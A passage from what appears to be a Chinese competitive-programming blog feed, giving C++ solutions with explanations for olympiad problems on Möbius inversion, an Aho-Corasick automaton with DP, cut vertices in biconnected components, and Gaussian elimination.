<p><span class="math display">\[
n&#39; = \lfloor \frac{n}{k} \rfloor, m&#39; = \lfloor \frac{m}{k}
\rfloor
\]</span></p>
<p><span class="math display">\[
A&#39;(n&#39;, m&#39;) = A(n, m, k) = \sum_{t = 1}^{ \min\{n&#39;,
m&#39;\} }{\mu(t) \lfloor \frac{n&#39;}{t} \rfloor \lfloor
\frac{m&#39;}{t} \rfloor }
\]</span></p>
<p>对于 <span class="math inline">\(A&#39;(n&#39;,
m&#39;)\)</span>，我们可以先统计出 <span
class="math inline">\(\mu(t)\)</span>
的前缀和，再用数论分块求解。这时候的单词询问时间复杂度优化到了 <span
class="math inline">\(O(\sqrt{n})\)</span>，可过此题。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">5e4</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> isNotPrime[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> mu[MAXN + <span class="number">1</span>], primes[MAXN + <span class="number">1</span>], cnt;</span><br><span class="line"><span class="type">int</span> sumMu[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">getPrimes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    isNotPrime[<span class="number">0</span>] = isNotPrime[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">    mu[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= MAXN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isNotPrime[i]) &#123;</span><br><span class="line">            primes[++cnt] = i;</span><br><span class="line">            mu[i] = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= cnt; j++) &#123;</span><br><span class="line">            <span class="type">int</span> t = i * primes[j];</span><br><span class="line">            <span class="keyword">if</span> (t &gt; MAXN) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            isNotPrime[t] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i % primes[j] == <span class="number">0</span>) &#123;</span><br><span class="line">                mu[t] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> mu[t] = -mu[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sumMu[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= MAXN; i++) sumMu[i] = sumMu[i - <span class="number">1</span>] + mu[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">f</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    n /= k, m /= k;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">1</span>, r; l &lt;= std::<span class="built_in">min</span>(n, m); l = r + <span class="number">1</span>) &#123;</span><br><span class="line">        r = std::<span class="built_in">min</span>(n / (n / l), m / (m / l));</span><br><span class="line">        ans += (sumMu[r] - sumMu[l - <span class="number">1</span>]) * ((n / l) * (m / l));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">getPrimes</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;t);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (t--) &#123;</span><br><span class="line">        <span class="type">int</span> a, b, c, d, k;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d %d&quot;</span>, &amp;a, &amp;b, &amp;c, &amp;d, &amp;k);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">f</span>(b, d, k) - <span class="built_in">f</span>(a - <span class="number">1</span>, d, k) - <span class="built_in">f</span>(b, c - <span class="number">1</span>, k) + <span class="built_in">f</span>(a - <span class="number">1</span>, c - <span class="number">1</span>, k));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>省选</tag>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>HAOI</tag>
        <tag>线性筛</tag>
        <tag>莫比乌斯反演</tag>
        <tag>2011</tag>
      </tags>
  </entry>
  <entry>
    <title>「JSOI2007」文本生成器 - AC 自动机 + DP</title>
    <url>/jsoi2007-generator/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P4052">洛谷链接</a></p>
<p><a href="https://loj.ac/p/10063">LibreOJ 链接</a></p>
<p>JSOI 交给队员 ZYX
一个任务，编制一个称之为“文本生成器”的电脑软件：该软件的使用者是一些低幼人群，他们现在使用的是
GW 文本生成器 v6 版。</p>
<p>该软件可以随机生成一些文章——总是生成一篇长度固定且完全随机的文章。
也就是说，生成的文章中每个字符都是完全随机的。如果一篇文章中至少包含使用者们了解的一个单词，那么我们说这篇文章是可读的（我们称文章
<span class="math inline">\(s\)</span> 包含单词 <span
class="math inline">\(t\)</span>，当且仅当单词 <span
class="math inline">\(t\)</span> 是文章 <span
class="math inline">\(s\)</span>
的子串）。但是，即使按照这样的标准，使用者现在使用的 GW 文本生成器 v6
版所生成的文章也是几乎完全不可读的。ZYX 需要指出 GW 文本生成器 v6
生成的所有文本中，可读文本的数量，以便能够成功获得 v7
更新版。你能帮助他吗？</p>
<p>答案对 <span class="math inline">\(10^4 + 7\)</span> 取模。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>该题问题不好求解，我们可转化为统计不含所有要求字符串的文本数量，用总数量减去该数即为答案。</p>
<p>于是我们可以考虑建立 AC 自动机，并在 AC 自动机上进行 DP，碰到
<code>end</code> 标记就不转移即可。</p>
<p>在建立 AC 自动机的时候，我们可以编写
<code>end[trie[u][i]] += end[trie[fail[u]][i]]</code>，以使 fail
节点继承原本节点的字符串节点标记，即可使 DP
遇到所有要求字符串均不统计。</p>
<p>设 <span class="math inline">\(f_{i, j}\)</span> 表示目前在文本第
<span class="math inline">\(i\)</span> 位，且在 AC 自动机匹配时在节点
<span class="math inline">\(j\)</span>
时符合条件的总情况。则有下列转移方程（<span
class="math inline">\(\text{trie}_{j, k}\)</span> 为在 AC 自动机节点
<span class="math inline">\(j\)</span> 上且文本下一位为 <span
class="math inline">\(k\)</span> 时匹配的节点）：</p>
<p><span class="math display">\[
f_{i + 1, \text{trie}_{j, k}} =
\begin{cases}
0 &amp; k \in [\text{A}, \text{Z}] \wedge \text{end}_k &gt; 0 \\
f_{i + 1, \text{trie}_{j, k}} + f_{i, j} &amp; k \in [\text{A},
\text{Z}] \wedge \text{end}_k = 0
\end{cases}
\]</span></p>
<p>最后统计 <span class="math inline">\(26^n - \sum_{i \in \text{AC}}
f_{n, i}\)</span>（<span class="math inline">\(\text{AC}\)</span> 为 AC
自动机所有节点的集合，<span class="math inline">\(n\)</span>
为文本长度）即为答案。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">60</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXM = <span class="number">100</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXS = <span class="number">100</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MOD = <span class="number">1e4</span> + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> trie[MAXN * MAXS + <span class="number">1</span>][<span class="number">26</span>], tot = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> end[MAXN * MAXS + <span class="number">1</span>], fail[MAXN * MAXS + <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> f[MAXM + <span class="number">1</span>][MAXN * MAXS + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">char</span> *s)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(s), p = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!trie[p][s[i] - <span class="string">&#x27;A&#x27;</span>]) trie[p][s[i] - <span class="string">&#x27;A&#x27;</span>] = ++tot;</span><br><span class="line">        p = trie[p][s[i] - <span class="string">&#x27;A&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    end[p]++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (trie[<span class="number">0</span>][i]) &#123;</span><br><span class="line">            q.<span class="built_in">push</span>(trie[<span class="number">0</span>][i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="type">int</span> u = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (trie[u][i]) &#123;</span><br><span class="line">                fail[trie[u][i]] = trie[fail[u]][i];</span><br><span class="line">                end[trie[u][i]] += end[trie[fail[u]][i]];</span><br><span class="line">                q.<span class="built_in">push</span>(trie[u][i]);</span><br><span class="line">            &#125; <span class="keyword">else</span> trie[u][i] = trie[fail[u]][i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">pow</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (; b; b &gt;&gt;= <span class="number">1</span>, a = a * a % MOD) <span class="keyword">if</span> (b &amp; <span class="number">1</span>) ans = ans * a % MOD;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">        <span class="type">static</span> <span class="type">char</span> s[MAXS + <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">        <span class="built_in">insert</span>(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">build</span>();</span><br><span class="line"></span><br><span class="line">    f[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= tot; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">26</span>; k++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!end[trie[j][k]]) &#123;</span><br><span class="line">                    f[i + <span class="number">1</span>][trie[j][k]] = (f[i + <span class="number">1</span>][trie[j][k]] + f[i][j]) % MOD;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ans = <span class="built_in">pow</span>(<span class="number">26</span>, m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= tot; i++) ans = (ans - f[m][i] + MOD) % MOD;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>省选</tag>
        <tag>字符串</tag>
        <tag>2007</tag>
        <tag>AC 自动机</tag>
        <tag>JSOI</tag>
      </tags>
  </entry>
  <entry>
    <title>「HNOI2012」矿场搭建 - 点双连通分量 + 割点</title>
    <url>/hnoi2012-mine/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P3225">洛谷链接</a></p>
<p><a href="https://loj.ac/p/10099">LibreOJ 链接</a></p>
<p>煤矿工地可以看成是由隧道连接挖煤点组成的无向图。为安全起见，希望在工地发生事故时所有挖煤点的工人都能有一条出路逃到救援出口处。于是矿主决定在某些挖煤点设立救援出口，使得无论哪一个挖煤点坍塌之后，其他挖煤点的工人都有一条道路通向救援出口。</p>
<p>请写一个程序，用来计算至少需要设置几个救援出口，以及不同最少救援出口的设置方案总数。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>对于同一个点双连通分量的点，如果有坍塌则方案情况相同。于是我们可以先进行点双连通分量缩点，然后形成一个
DAG。接下来我们进行讨论：</p>
<ol type="1">
<li>若一个点双连通分量没有割点：会堵住一个点，故需要 <span
class="math inline">\(2\)</span> 个出口；</li>
<li>若一个点双连通分量有 <span class="math inline">\(1\)</span>
个割点：可从这个割点逃出，故只需 <span class="math inline">\(1\)</span>
个出口；</li>
<li>若一个点双连通分量 <span class="math inline">\(2\)</span>
个及以上个割点：无论如何都可逃出，无需出口。</li>
</ol>
<p>于是我们缩点后统计每个双连通分量即可。</p>
<p>对于统计方案，我们设某个双连通分量的节点数为 <span
class="math inline">\(s\)</span>，则对于上列情况，分别对应情况数为 <span
class="math inline">\(C_s^2\)</span>、<span
class="math inline">\(C_s^1\)</span> 和 <span
class="math inline">\(C_s^0\)</span>，即 <span
class="math inline">\(\frac{s(s - 1)}{2}\)</span>、<span
class="math inline">\(s\)</span> 和 <span
class="math inline">\(1\)</span>。将所有点双连通分量方案相乘即为总方案。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; G[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="type">bool</span> cut[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dfn[MAXN + <span class="number">1</span>], low[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> ts = <span class="number">0</span>, root;</span><br><span class="line">std::stack&lt;<span class="type">int</span>&gt; stk;</span><br><span class="line"></span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; dcc[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> cnt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tarjan</span><span class="params">(<span class="type">int</span> u)</span> </span>&#123;</span><br><span class="line">    dfn[u] = low[u] = ++ts;</span><br><span class="line">    stk.<span class="built_in">push</span>(u);</span><br><span class="line">    <span class="keyword">if</span> (u == root &amp;&amp; G[u].<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        dcc[++cnt].<span class="built_in">push_back</span>(u);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> v : G[u]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!dfn[v]) &#123;</span><br><span class="line">            <span class="built_in">tarjan</span>(v);</span><br><span class="line">            low[u] = std::<span class="built_in">min</span>(low[u], low[v]);</span><br><span class="line">            <span class="keyword">if</span> (low[v] &gt;= dfn[u]) &#123;</span><br><span class="line">                flag++;</span><br><span class="line">                <span class="keyword">if</span> (u != root || flag &gt; <span class="number">1</span>) cut[u] = <span class="literal">true</span>;</span><br><span class="line">                cnt++;</span><br><span class="line">                <span class="type">int</span> w;</span><br><span class="line">                <span class="keyword">do</span> &#123;</span><br><span class="line">                    w = stk.<span class="built_in">top</span>();</span><br><span class="line">                    stk.<span class="built_in">pop</span>();</span><br><span class="line">                    dcc[cnt].<span class="built_in">push_back</span>(w);</span><br><span class="line">                &#125; <span class="keyword">while</span> (w != v);</span><br><span class="line">                dcc[cnt].<span class="built_in">push_back</span>(u);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> low[u] = std::<span class="built_in">min</span>(low[u], dfn[v]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    n = ts = cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAXN; i++) G[i].<span class="built_in">clear</span>();</span><br><span class="line">    <span class="built_in">memset</span>(cut, <span class="literal">false</span>, <span class="built_in">sizeof</span>(cut));</span><br><span class="line">    <span class="built_in">memset</span>(dfn, <span class="number">0</span>, <span class="built_in">sizeof</span>(dfn));</span><br><span class="line">    <span class="built_in">memset</span>(low, <span class="number">0</span>, <span class="built_in">sizeof</span>(low));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAXN; i++) dcc[i].<span class="built_in">clear</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;m) != EOF &amp;&amp; m) &#123;</span><br><span class="line">        <span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line">        std::map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; mp;</span><br><span class="line">        mp.<span class="built_in">clear</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> u, v;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;u, &amp;v);</span><br><span class="line">            <span class="keyword">if</span> (!mp[u]) mp[u] = ++n;</span><br><span class="line">            <span class="keyword">if</span> (!mp[v]) mp[v] = ++n;</span><br><span class="line">            G[mp[u]].<span class="built_in">push_back</span>(mp[v]);</span><br><span class="line">            G[mp[v]].<span class="built_in">push_back</span>(mp[u]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!dfn[i]) &#123;</span><br><span class="line">                root = i;</span><br><span class="line">                <span class="built_in">tarjan</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>, cases = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= cnt; i++) &#123;</span><br><span class="line">            <span class="type">int</span> cnts = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> u : dcc[i]) <span class="keyword">if</span> (cut[u]) cnts++;</span><br><span class="line">            <span class="keyword">if</span> (cnts == <span class="number">0</span>) ans += <span class="number">2</span>, cases *= <span class="number">1ull</span> * dcc[i].<span class="built_in">size</span>() * (dcc[i].<span class="built_in">size</span>() - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (cnts == <span class="number">1</span>) ans++, cases *= dcc[i].<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Case %d: %llu %llu\n&quot;</span>, ++t, ans, cases);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>省选</tag>
        <tag>图论</tag>
        <tag>Tarjan</tag>
        <tag>点双连通分量</tag>
        <tag>割点</tag>
        <tag>HNOI</tag>
        <tag>2012</tag>
      </tags>
  </entry>
  <entry>
    <title>「JSOI2008」球形空间产生器 - 高斯消元</title>
    <url>/jsoi2008-sphere/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P4035">洛谷链接</a></p>
<p>有一个球形空间产生器能够在 <span class="math inline">\(n\)</span>
维空间中产生一个坚硬的球体。现在，你被困在了这个 <span
class="math inline">\(n\)</span> 维球体中，你只知道球面上 <span
class="math inline">\(n + 1\)</span>
个点的坐标，你需要以最快的速度确定这个 <span
class="math inline">\(n\)</span>
维球体的球心坐标，以便于摧毁这个球形空间产生器。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>对于本题，我们可以感性感知到这道题是高斯消元。于是我们可以通过距离公式推出下列式子：</p>
<p><span class="math display">\[
\sum_{j = 1}^{n} (a_{i, j} - x_j)^2 = \text{dis} \quad i \in [1, n] \cap
\mathbb{Z}
\]</span></p>
<p>其中 <span class="math inline">\(\text{dis}\)</span> 为常量。</p>
<p>对于该式化简会出现二次项，不好计算，我们需要把二次项化掉，同时化掉
<span class="math inline">\(\text{dis}\)</span>。</p>
<p>于是我们可以将相邻两项作差，得到下列式子：</p>
<p><span class="math display">\[
\sum_{j = 1}^{n} ( a_{i, j}^2 - a_{i + 1, j}^2 - 2(a_{i, j} - a_{i + 1,
j})x_j ) = 0 \quad i \in [1, n] \cap \mathbb{Z}
\]</span></p>
<p>然后移项得到下列式子：</p>
<p><span class="math display">\[
\sum_{j = 1}^{n} 2(a_{i, j} - a_{i + 1})x_j = \sum_{j = 1}^{n} (a_{i,
j}^2 - a_{i + 1, j}^2) \quad i \in [1, n] \cap \mathbb{Z}
\]</span></p>
<p>由于 <span class="math inline">\(a_{i, j}\)</span>，<span
class="math inline">\(n\)</span> 为常量，故 <span
class="math inline">\(x_j\)</span> 可用高斯消元求解，最后得解。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">double</span> pos[MAXN + <span class="number">2</span>][MAXN + <span class="number">1</span>], a[MAXN + <span class="number">1</span>][MAXN + <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gauss</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt;= n + <span class="number">1</span>; j++) a[i][j] /= a[i][i];</span><br><span class="line">        a[i][i] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = i + <span class="number">1</span>; k &lt;= n + <span class="number">1</span>; k++) &#123;</span><br><span class="line">                a[j][k] -= a[i][k] * a[j][i] / a[i][i];</span><br><span class="line">            &#125;</span><br><span class="line">            a[j][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = n; i &gt; <span class="number">1</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; i; j++) &#123;</span><br><span class="line">            a[j][n + <span class="number">1</span>] -= a[i][n + <span class="number">1</span>] * a[j][i] / a[i][i];</span><br><span class="line">            a[j][i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        a[i][n + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            a[i][j] = <span class="number">2</span> * (pos[i][j] - pos[i + <span class="number">1</span>][j]);</span><br><span class="line">            a[i][n + <span class="number">1</span>] += pos[i][j] * pos[i][j] - pos[i + <span class="number">1</span>][j] * pos[i + <span class="number">1</span>][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    std::cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n + <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            std::cin &gt;&gt; pos[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">gauss</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%.3f &quot;</span>, a[i][n + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; 